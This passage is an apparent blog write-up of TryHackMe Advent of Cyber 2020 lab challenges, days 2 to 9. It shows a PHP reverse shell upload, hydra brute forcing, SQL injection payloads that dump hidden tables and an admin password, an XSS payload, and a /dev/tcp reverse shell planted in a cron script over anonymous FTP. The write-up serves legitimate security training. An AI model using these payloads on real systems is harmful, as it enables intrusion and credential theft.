change the following lines in the PHP file:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"$ip = '127.0.0.1';  // CHANGE THIS\n$port = 1234;       // CHANGE THIS\n")),(0,i.kt)("p",null,"Then, I renamed the file to ",(0,i.kt)("inlineCode",{parentName:"p"},"php-reverse-shell.jpg.php")," to circumvent the checks and uploaded the file."),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"Establishing the reverse shell connection")),(0,i.kt)("p",null,"Since I set the PHP reverse shell to connect on port 4444, I set up a netcat listener on that port."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"nc -lvnp 4444\n")),(0,i.kt)("p",null,"Finally, I visited the following URL ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.119.58/uploads/")," to run the PHP script.  "),(0,i.kt)("p",null,"I was then greated by this beautiful message:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Listening on 0.0.0.0 4444\nConnection received on 10.10.119.58 54002\nLinux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 13:25:23 up 41 min,  0 users,  load average: 0.00, 0.00, 0.09\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=48(apache) gid=48(apache) groups=48(apache)\nsh: cannot set terminal process group (823): Inappropriate ioctl for device\nsh: no job control in this shell\nsh-4.4$\n")),(0,i.kt)("p",null,"Bingo! Now that we have a reverse shell, what next?"),(0,i.kt)("h3",{id:"what-is-the-flag-in-varwwwflagtxt"},"What is the flag in /var/www/flag.txt?"),(0,i.kt)("p",null,"First, I made sure I was successfully connected to the server:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"sh-4.4$ whoami\nwhoami\napache\nsh-4.4$ pwd\npwd\n/\n")),(0,i.kt)("p",null,"Now that we have a shell, we can read the flag:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"sh-4.4$ cat /var/www/flag.txt\ncat /var/www/flag.txt\n\n\n==============================================================\n\n\nYou've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! \nThis is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. \n\n\nHave a flag -- you deserve it!\nTHM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}\n\n\nGood luck on your mission (and maybe I'll see y'all again on Christmas Eve)!\n --Muiri (@MuirlandOracle)\n\n\n==============================================================\n")),(0,i.kt)("p",null,"And so with that, we get a nice message and the flag."),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}")),(0,i.kt)("h2",{id:"day-3-christmas-chaos"},"Day 3: Christmas Chaos"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Web Exploitation"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Authentication Bypass"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Hack the hackers and bypass a login page to gain admin privileges.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.88.75")),(0,i.kt)("h3",{id:"basic-enumeration-2"},"Basic Enumeration"),(0,i.kt)("p",null,"As always, we check out the webpage running on port 80 first."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(73365).Z,width:"1844",height:"842"})),(0,i.kt)("h3",{id:"brute-force-attack"},"Brute force attack"),(0,i.kt)("p",null,"As suggested by the lesson on TryHackMe, we can use a dictionary attack to break the authentication and gain unauthorized access.  "),(0,i.kt)("p",null,"First, I created the username and password wordlist using the dictionary provided (",(0,i.kt)("a",{target:"_blank",href:n(93362).Z},"username dictionary")," and ",(0,i.kt)("a",{target:"_blank",href:n(59437).Z},"password dictionary"),")."),(0,i.kt)("p",null,"Next, I monitored the network traffic in Firefox to see how the login request is being sent. Unsurprisingly, this web app sends a post request with the form data."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(65962).Z,width:"1847",height:"350"})),(0,i.kt)("p",null,"Then I used the following ",(0,i.kt)("inlineCode",{parentName:"p"},"hydra")," command to find the username and password. ",(0,i.kt)("inlineCode",{parentName:"p"},"-L")," is used to specify the username dictionary, ",(0,i.kt)("inlineCode",{parentName:"p"},"-P")," is used to specify the password dictionary, http-post-form and the string is used to specify how to send the login request. ",(0,i.kt)("inlineCode",{parentName:"p"},"^USER^")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"^PASS^")," are replaced by the username or password from the wordlist respectively. ",(0,i.kt)("inlineCode",{parentName:"p"},"incorrect")," at the very end it is part error message when we use the wrong username password combo."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},'hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"\n')),(0,i.kt)("p",null,"And sure enough, we find the username and password:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[80][http-post-form] host: 10.10.88.75   login: admin   password: 12345\n")),(0,i.kt)("p",null,"Now that we have credentials, we can log in and get the flag!"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(56355).Z,width:"1834",height:"845"})),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{885ffab980e049847516f9d8fe99ad1a}")),(0,i.kt)("h2",{id:"day-4-santas-watching"},"Day 4: Santa's watching"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Web Exploitation"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Authorization Bypass"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Exploit Santa's login form and obtain admin credentials to save Santa's nice list!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.252.228")),(0,i.kt)("p",null,"Assets:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Wordlist for Gobuster (",(0,i.kt)("a",{parentName:"li",href:"https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt"},"danielmiessler/SecLists/Discovery/Web-Content/big.txt"),")"),(0,i.kt)("li",{parentName:"ul"},"Wordlist for wfuzz (",(0,i.kt)("a",{parentName:"li",href:"https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist"},"available for download"),") (also in the day04-santas-watching directory)")),(0,i.kt)("h3",{id:"given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory"},"Given the URL ",(0,i.kt)("inlineCode",{parentName:"h3"},"http://shibes.xyz/api.php"),', what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)'),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"wfuzz -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ")),(0,i.kt)("h3",{id:"basic-enumeration-3"},"Basic Enumeration"),(0,i.kt)("p",null,"By know, you probably know the drill. Step 1: visit the website running on port 80."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(21562).Z,width:"1846",height:"846"})),(0,i.kt)("p",null,"Huh, there seems to be not much of interest on the page or in the source code for the page."),(0,i.kt)("h3",{id:"finding-the-api-directory-using-gobuster"},"Finding the API directory using Gobuster"),(0,i.kt)("p",null,"We can use gobuster to find hidden directories:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"gobuster -u http://10.10.252.228/ -w day04-santas-watching/big.txt -x php,txt,html\n")),(0,i.kt)("p",null,"And we find the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"=====================================================\nGobuster v2.0.1              OJ Reeves (@TheColonial)\n=====================================================\n[+] Mode         : dir\n[+] Url/Domain   : http://10.10.252.228/\n[+] Threads      : 10\n[+] Wordlist     : day04-santas-watching/big.txt\n[+] Status codes : 200,204,301,302,307,403\n[+] Extensions   : html,php,txt\n[+] Timeout      : 10s\n=====================================================\n2020/12/04 15:24:55 Starting gobuster\n=====================================================\n/.htpasswd (Status: 403)\n/.htpasswd.php (Status: 403)\n/.htpasswd.txt (Status: 403)\n/.htaccess (Status: 403)\n/.htpasswd.html (Status: 403)\n/.htaccess.php (Status: 403)\n/.htaccess.txt (Status: 403)\n/.htaccess.html (Status: 403)\n/LICENSE (Status: 200)\n/api (Status: 301)\n")),(0,i.kt)("p",null,"If we visit ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.252.228/api")," we can find the empty ",(0,i.kt)("inlineCode",{parentName:"p"},"site-log.php")," file."),(0,i.kt)("h3",{id:"fuzz-the-date-parameter-on-the-file-you-found-in-the-api-directory-what-is-the-flag-displayed-in-the-correct-post"},"Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?"),(0,i.kt)("p",null,"We can use the following wfuzz command to fuzz the date get parameter:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"wfuzz -c --hh 0 -z file,day04-santas-watching/wordlist http://10.10.252.228/api/site-log.php?date=FUZZ\n")),(0,i.kt)("p",null,"After running the command, we get the following output:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'Target: http://10.10.252.228/api/site-log.php?date=FUZZ\nTotal requests: 63\n\n===================================================================\nID           Response   Lines    Word     Chars       Payload                                                                                                                                                     \n===================================================================\n\n000000026:   200        0 L      1 W      13 Ch       "20201125"                                                                                                                                                  \n\nTotal time: 3.005774\nProcessed Requests: 63\nFiltered Requests: 62\nRequests/sec.: 20.95965\n')),(0,i.kt)("h3",{id:"getting-the-flag-1"},"Getting the flag"),(0,i.kt)("p",null,"Now that we know where to find the flag, we can simply use cURL to actually get the flag:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"curl http://10.10.252.228/api/site-log.php?date=20201125\n")),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{D4t3_AP1}")),(0,i.kt)("h2",{id:"day-5-someone-stole-santas-gift-list"},"Day 5: Someone stole Santa's gift list!"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Web Exploitation"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: SQL injection, PHP"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Learn to detect and exploit one of the most dangerous web vulnerabilities!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.220.236"),(0,i.kt)("br",{parentName:"p"}),"\n","Port: ",(0,i.kt)("inlineCode",{parentName:"p"},"8000")),(0,i.kt)("h3",{id:"without-using-directory-brute-forcing-whats-santas-secret-login-panel"},"Without using directory brute forcing, what's Santa's secret login panel?"),(0,i.kt)("p",null,"Using the hint, we know that the panel is located at ",(0,i.kt)("inlineCode",{parentName:"p"},"/santapanel")),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(82725).Z,width:"1846",height:"847"})),(0,i.kt)("h3",{id:"bypass-the-login-using-sql-injection"},"Bypass the login using SQL injection"),(0,i.kt)("p",null,"Visiting ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.220.236:8000/santapanel"),", we see there is a login page which I assumed to be vulnerable to SQLi. Therefore, I tried the following payload and sure enough, I was able to gain access to the santapanel"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"' OR 1==1;--\n")),(0,i.kt)("p",null,"The full SQL command would then look something like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM some_table WHERE username='' OR 1==1;-- AND password='';\n")),(0,i.kt)("p",null,"As you can see, every entry in this tabble will be returned even if the username doesn't match since 1==1 always evaluates to true."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(1209).Z,width:"1843",height:"842"})),(0,i.kt)("h3",{id:"how-many-entries-are-there-in-the-gift-database"},"How many entries are there in the gift database?"),(0,i.kt)("p",null,"We can supply a wildcard character (",(0,i.kt)("inlineCode",{parentName:"p"},"%"),") to select every entry into the database. If we count them, we see that we have 22 entries."),(0,i.kt)("p",null,"We also see that ",(0,i.kt)("inlineCode",{parentName:"p"},"Paul")," asked for ",(0,i.kt)("inlineCode",{parentName:"p"},"github ownership"),"."),(0,i.kt)("h3",{id:"finding-the-flag"},"Finding the flag"),(0,i.kt)("p",null,"First we need to find the table names and their schema. We do so using the following SQLi payload to union the tbl_name and sql fields from the sqlite_master table:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"%' UNION SELECT tbl_name, sql FROM sqlite_master;--\n")),(0,i.kt)("p",null,"Which expands to the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT tbl_name, sql FROM sqlite_master;--;\n")),(0,i.kt)("p",null,"We get the following result:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"hidden_table | CREATE TABLE hidden_table (flag text)\nsequels | CREATE TABLE sequels (title text, kid text, age integer)\nusers | CREATE TABLE users (username text, password text)\n")),(0,i.kt)("p",null,"To get the flag, we can use the following SQLi payload"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"%' UNION SELECT 1, flag FROM hidden_table;--\n")),(0,i.kt)("p",null,"Which expands to the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT 1, flag FROM hidden_table;--;\n")),(0,i.kt)("p",null,"Then we find the flag in the table."),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"thmfox{All_I_Want_for_Christmas_Is_You}")),(0,i.kt)("h3",{id:"getting-the-admin-password"},"Getting the admin password"),(0,i.kt)("p",null,"Once again, we use a SQLi payload."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"%' UNION SELECT username, password FROM users;--\n")),(0,i.kt)("p",null,"In the table we can find the admin's password."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"admin:EhCNSWzzFP6sc7gB\n")),(0,i.kt)("h2",{id:"day-6-be-careful-with-what-you-wish-on-a-christmas-night"},"Day 6: Be careful with what you wish on a Christmas night"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Web Exploitation"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: JavaScript"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Get familiar with compromising user interactions with vulnerable applications by executing custom javascript code.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.157.100"),(0,i.kt)("br",{parentName:"p"}),"\n","Port: ",(0,i.kt)("inlineCode",{parentName:"p"},"5000")),(0,i.kt)("h3",{id:"finding-the-cross-site-scripting"},"Finding the cross-site scripting"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(77879).Z,width:"1848",height:"847"})),(0,i.kt)("h4",{id:"stored-cross-site-scripting"},"Stored cross-site scripting"),(0,i.kt)("p",null,"Found in the ",(0,i.kt)("inlineCode",{parentName:"p"},"enter a wish here")," box."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(35185).Z,width:"1847",height:"848"})),(0,i.kt)("h4",{id:"reflected-cross-site-scripting"},"Reflected cross-site scripting"),(0,i.kt)("p",null,"Found in the ",(0,i.kt)("inlineCode",{parentName:"p"},"search query")," box."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(89214).Z,width:"1849",height:"849"})),(0,i.kt)("h4",{id:"how-to-exploit"},"How to exploit?"),(0,i.kt)("p",null,"Type the following payload into either of them to see a cross-site scripting pop-up:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<script>alert("XSS");<\/script>\n')),(0,i.kt)("h3",{id:"getting-the-flag-2"},"Getting the flag"),(0,i.kt)("p",null,"Well unfortunately, there is no flag for this challenge. So here's a fake flag that I made!"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(12782).Z,width:"1847",height:"842"})),(0,i.kt)("h2",{id:"day-7-the-grinch-really-did-steal-christmas"},"Day 7: The Grinch Really Did Steal Christmas"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Understand a few of the technologies that power the internet! Use this knowledge to track the activity of the Grinch who stole christmas!")),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Networking"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Wireshark, Packet Analysis"),"  "),(0,i.kt)("p",null,"File: ",(0,i.kt)("a",{parentName:"p",href:"day07-the-grinch-really-did-steal-christmas/aoc.pcaps.zip"},"aoc-pcaps.zip"),(0,i.kt)("br",{parentName:"p"}),"\n","Prerequesite Software: Wireshark  "),(0,i.kt)("h3",{id:"unzipping"},"Unzipping"),(0,i.kt)("p",null,"Before we begin, we must unzip the file as follows:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"cd day07-the-grinch-really-did-steal-christmas/\nunzip aoc-pcaps.zip\n")),(0,i.kt)("p",null,"And we see that there are 3 ",(0,i.kt)("inlineCode",{parentName:"p"},".pcap")," files:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Archive:  aoc-pcaps.zip\n  inflating: pcap1.pcap              \n  inflating: pcap2.pcap              \n  inflating: pcap3.pcap \n")),(0,i.kt)("h3",{id:"pcap1pcap"},"pcap1.pcap"),(0,i.kt)("h4",{id:"open-pcap1pcap-in-wireshark-what-is-the-ip-address-that-initiates-an-icmpping"},'Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?'),(0,i.kt)("p",null,"We open pcap1.pcap in Wireshark and look for the source IP of the ping request."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(99006).Z,width:"1850",height:"395"})),(0,i.kt)("p",null,"We see that ",(0,i.kt)("inlineCode",{parentName:"p"},"10.11.3.2")," is pinging ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.15.52"),"."),(0,i.kt)("h4",{id:"filtering-to-see-http-get-requests"},"Filtering to see HTTP GET requests"),(0,i.kt)("p",null,"The ",(0,i.kt)("inlineCode",{parentName:"p"},"http.request.method == get")," filter can be used to only see the HTTP GET requests.  "),(0,i.kt)("p",null,"We can use this filter (",(0,i.kt)("inlineCode",{parentName:"p"},"http.request.method == GET && ip.src == 10.10.67.199"),") to further narrow it down as needed.  "),(0,i.kt)("p",null,"Sifting through the packets, we can see that ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.67.199")," read ",(0,i.kt)("inlineCode",{parentName:"p"},"reindeer-of-the-week"),".  "),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(99900).Z,width:"1847",height:"949"})),(0,i.kt)("h3",{id:"pcap2pcap"},"pcap2.pcap"),(0,i.kt)("h4",{id:"find-the-password-used-for-ftp"},"Find the password used for FTP"),(0,i.kt)("p",null,"We filter the traffic by using the protocol ",(0,i.kt)("inlineCode",{parentName:"p"},"FTP"),".  "),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(70363).Z,width:"1848",height:"529"})),(0,i.kt)("p",null,"Then we can follow the TCP stream to find the password.  "),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(84032).Z,width:"1234",height:"306"})),(0,i.kt)("p",null,"The leaked password is: ",(0,i.kt)("inlineCode",{parentName:"p"},"plaintext_password_fiasco"),"  "),(0,i.kt)("h4",{id:"what-is-the-name-of-the-protocol-that-is-encrypted"},"What is the name of the protocol that is encrypted?"),(0,i.kt)("p",null,"Looking at the wireshark, we can see the SSH protocol which is encrypted."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(19971).Z,width:"1847",height:"391"})),(0,i.kt)("h3",{id:"pcap3pcap"},"pcap3.pcap"),(0,i.kt)("p",null,"Looking through wireshark, we see a lot of SSH and HTTP traffic. Since SSH is encrypted, the HTTP is more interesting. We see that there is downloading of files specifically a ",(0,i.kt)("inlineCode",{parentName:"p"},"christmas.zip")," file, so we extract that and save it onto out machine for further investigation."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(94050).Z,width:"1848",height:"516"})),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(52915).Z,width:"753",height:"556"})),(0,i.kt)("p",null,"Then we can unzip ",(0,i.kt)("inlineCode",{parentName:"p"},"christmas.zip"),". We find the following files:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Archive:  christmas.zip\n  inflating: AoC-2020.png            \n  inflating: christmas-tree.jpg      \n  inflating: elf_mcskidy_wishlist.txt  \n  inflating: Operation Artic Storm.pdf  \n  inflating: selfie.jpg              \n  inflating: tryhackme_logo_full.svg  \n")),(0,i.kt)("p",null,"We can read Elf McSkidy's wishlist using the following command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"cat day07-the-grinch-really-did-steal-christmas/christmas/elf_mcskidy_wishlist.txt\n")),(0,i.kt)("p",null,"And we see the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Wish list for Elf McSkidy\n-------------------------\nBudget: \xa3100\n\nx3 Hak 5 Pineapples\nx1 Rubber ducky (to replace Elf McEager)\n")),(0,i.kt)("h2",{id:"day-8-whats-under-the-christmas-tree"},"Day 8: What's Under the Christmas Tree?"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Networking"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Nmap"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Practice the most fundamental stage of penetration testing: information gathering, using industry standard tools/techniques.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.2.45")),(0,i.kt)("h3",{id:"running-the-nmap-scan"},"Running the Nmap scan"),(0,i.kt)("p",null,"We run nmap with the following command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"nmap -sC -sV -A -O -oN day08-whats-under-the-christmas-tree/nmap.log 10.10.2.45\n")),(0,i.kt)("p",null,"And we get the following results:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 13:15 EST\nNmap scan report for tbfc.blog (10.10.2.45)\nHost is up (0.11s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: Hugo 0.78.2\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: TBFC&#39;s Internal Blog\n2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)\n|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)\n|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)\n3389/tcp open  ms-wbt-server xrdp\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 86.52 seconds\n")),(0,i.kt)("h3",{id:"what-ports-are-open"},"What ports are open?"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Port 80 for HTTP"),(0,i.kt)("li",{parentName:"ul"},"Port 2222 for SSH"),(0,i.kt)("li",{parentName:"ul"},"Port 3389 for ms-wbt-server")),(0,i.kt)("h3",{id:"what-linux-distribution-is-the-box"},"What Linux Distribution is the box?"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"Ubuntu")),(0,i.kt)("h3",{id:"what-is-the-http-title-for-the-webserver"},'What is the "HTTP-TITLE" for the webserver'),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"http-title: TBFC&#39;s Internal Blog")),(0,i.kt)("h2",{id:"day-9-anyone-can-be-santa"},"Day 9: Anyone can be Santa!"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Networking"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: FTP")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Discover a common misconfiguration on file transfer servers, and understand how it may be abused.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.112.57")),(0,i.kt)("h3",{id:"connecting-to-the-ftp-server-and-basic-enumeration"},"Connecting to the FTP server and basic enumeration"),(0,i.kt)("p",null,"In a Linux Terminal, I used the ",(0,i.kt)("inlineCode",{parentName:"p"},"ftp")," command and connected to the FTP server as ",(0,i.kt)("inlineCode",{parentName:"p"},"anonymous"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ftp 10.10.112.57\n")),(0,i.kt)("p",null,"Now that we are in, let's see what files we can find..."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups\ndrwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops\ndrwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources\ndrwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"backups"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"elf_workshops")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"human_resources")," appear to be empty. However, let's investigate ",(0,i.kt)("inlineCode",{parentName:"p"},"public")," further."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ftp> cd public\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rwxr-xr-x    1 111      113           341 Nov 16 19:34 backup.sh\n-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt\n226 Directory send OK.\n")),(0,i.kt)("p",null,"Interesting, let's download these two files to examine them further..."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ftp> get backup.sh\nlocal: backup.sh remote: backup.sh\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for backup.sh (341 bytes).\n226 Transfer complete.\n341 bytes received in 0.00 secs (481.9216 kB/s)\nftp> get shoppinglist.txt\nlocal: shoppinglist.txt remote: shoppinglist.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).\n226 Transfer complete.\n24 bytes received in 0.00 secs (107.0206 kB/s)\n")),(0,i.kt)("p",null,"Success!"),(0,i.kt)("h3",{id:"shoppinglisttxt"},"shoppinglist.txt"),(0,i.kt)("p",null,"It turns out, ",(0,i.kt)("inlineCode",{parentName:"p"},"shoppinglist.txt")," isn't all that interesting... All we learn is that Santa has ",(0,i.kt)("inlineCode",{parentName:"p"},"The Polar Express Movie")," on his shopping list."),(0,i.kt)("h3",{id:"backupsh"},"backup.sh"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"backup.sh"),"? More like ",(0,i.kt)("inlineCode",{parentName:"p"},"backdoor.sh"),"...  "),(0,i.kt)("p",null,"This bash shell script seams to be a cron job (something that runs automatically at a set time or time interval on a Linux system). Let's modify it to set up a reverse shell! First, I set up a netcat listener of port 4444 by running ",(0,i.kt)("inlineCode",{parentName:"p"},"nc -lvnp 4444"),". Then, I added the following line to ",(0,i.kt)("inlineCode",{parentName:"p"},"backup.sh")," before uploading it to the FTP server. (note: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.6.23.34")," is the IP of my attack machine)"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"# Added this line\nbash -i >& /dev/tcp/10.6.23.34/4444 0>&1\n")),(0,i.kt)("h3",{id:"becoming-root-and-getting-the-flag"},"Becoming root and getting the flag!"),(0,i.kt)("p",null,"First, I uploaded the ",(0,i.kt)("inlineCode",{parentName:"p"},"backup.sh")," file with the payload from the previous section using FTP:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ftp> put backup.sh \nlocal: backup.sh remote: backup.sh\n200 PORT command successful. Consider using PASV.\n150 Ok to send data.\n226 Transfer complete.\n381 bytes sent in 0.00 secs (5.7675 MB/s)\n")),(0,i.kt)("p",null,"Sure enough, I got the reverse shell within seconds:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Listening on 0.0.0.0 4444\nConnection received on 10.10.112.57 60270\nbash: cannot set terminal process group 